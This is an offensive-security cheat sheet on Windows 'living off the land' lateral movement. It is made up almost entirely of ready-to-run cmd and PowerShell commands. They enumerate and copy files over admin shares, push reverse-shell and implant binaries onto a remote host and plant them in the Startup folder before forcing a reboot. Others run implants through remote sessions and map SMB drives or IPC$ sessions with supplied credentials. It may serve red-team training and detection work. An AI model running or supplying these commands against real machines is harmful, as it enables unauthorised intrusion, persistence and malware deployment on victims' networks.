# Living off the Land

Search Tag(s): #post-exploitation #lateral-movement #remote-file-access #living-off-the-land #windows

## 01 - List Files and Directories

### 1.1 - Command Prompt

List files and directories remotely

```
C:\> dir \\<IP>\c$
```

List all the files and directories

```
C:\> dir /s /b \\<IP>\c$ > files.txt
```

### 1.2 - Powershell

List files and directories remotely

```
PS C:\> Get-ChildItem \\<IP>\C$
```

List all the files and directories

```
C:\> ChildItem -Recurse \\<IP>\C$ > files.txt
```

## 02 - Copy Files

### 2.1 - Command Prompt

#### 2.1.1 - Copy Files Remotely

```
C:\> copy shell.exe \\<IP>\c$\folder\shell.exe

C:\> xcopy shell.exe \\<IP>\c$\folder\shell.exe

C:\> robocopy <source> <destination> <files>

C:\> robocopy \\<IP>\c$\folder\shell.exe shell.exe
```

#### 2.1.2 - Copy reverse shell callback on `Startup` folder

```
C:\> xcopy shell.exe "\\<IP>\c$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

C:\> robocopy C:\ "\\<IP>\c$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" shell.exe

C:\> shutdown /t 0 /r /m \\<IP>
```

### 2.2 - Powershell

#### 2.2.1 - Copy Files Remotely

```
PS C:\> Copy-Item implant.exe -Destination \\<IP>\C$\implant.exe
```

Copy the callback shell and execute it via powershell cmdlet.

```
PS C:\> $ip = New-PSSession -Computer <IP>

Copy-Item "C:\path\to\implant.exe" -Destination "C:\path\to\folder\" -ToSession $ip

icm -Session $ip -ScriptBlock { C:\path\to\implant.exe }
```

#### 2.2.2 - Copy reverse shell callback on `Startup` folder

```
PS C:\> Copy-Item shell.exe -destination "\\<IP>\c$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

PS C:\> Restart-Computer -ComputerName <IP> -Force
```

## 03 - Mapping SMB Drive Network

### 3.1 - Command Prompt

```
C:\> net use Z: \\<IP>\c$

C:\> net use Z: \\<IP>\C$ /user:"<username>" "<password>"

C:\> dir Z:\

C:\> net use Z: /delete
```

### 3.2 - Powershell

```
PS C:\> New-PSDrive -Name <drive_name> -PSProvider FileSystem -Credential $credential \\<IP>\<share_name>

PS C:\> Get-ChildItem <drive_name>:
```

To remove the mounted drive.

```
PS C:\> Remove-PSDrive -Name <drive_name>
```

## 04 - Manual Null Session

### 4.1 - Command Prompt

Authenticate null session with `IPC$` via net use commands to allow the user to execute any other commands remotely.

```
C:\> net use \\<IP>\IPC$ /u:"<username>" "<password>"

C:\> dir \\<IP>

C:\> net view \\<IP>
```

Ignore the authentication while authenticating session.

```
C:\> net use \\<IP>\IPC$ /u:"<username>" "<password>" > %TEMP%\~temp3936t.tmp 2>&1
```

## 05 - Spawn Implant

### 5.1 - Command Prompt

```
C:\> cmd.exe /q /c "C:\path\to\shell.exe" 1> \\<IP>\ADMIN$\<filename> 2>&1
```

## 06 - Terminate all the sessions

### 6.1 - Command Prompt

```
C:\> net use /delete *
```

---
## References

- [LOFLCAB: Get-ChildItem](https://lofl-project.github.io/loflcab/Cmdlets/Get-ChildItem/)

- [LOFLCAB: Copy-Item](https://lofl-project.github.io/loflcab/Cmdlets/Copy-Item/)

- [LOFLCAB: net.exe](https://lofl-project.github.io/loflcab/Binaries/net/)

- [Hacking Articles: Remote Services (Mitre:T1021)](https://www.hackingarticles.in/lateral-movement-remote-services-mitret1021/)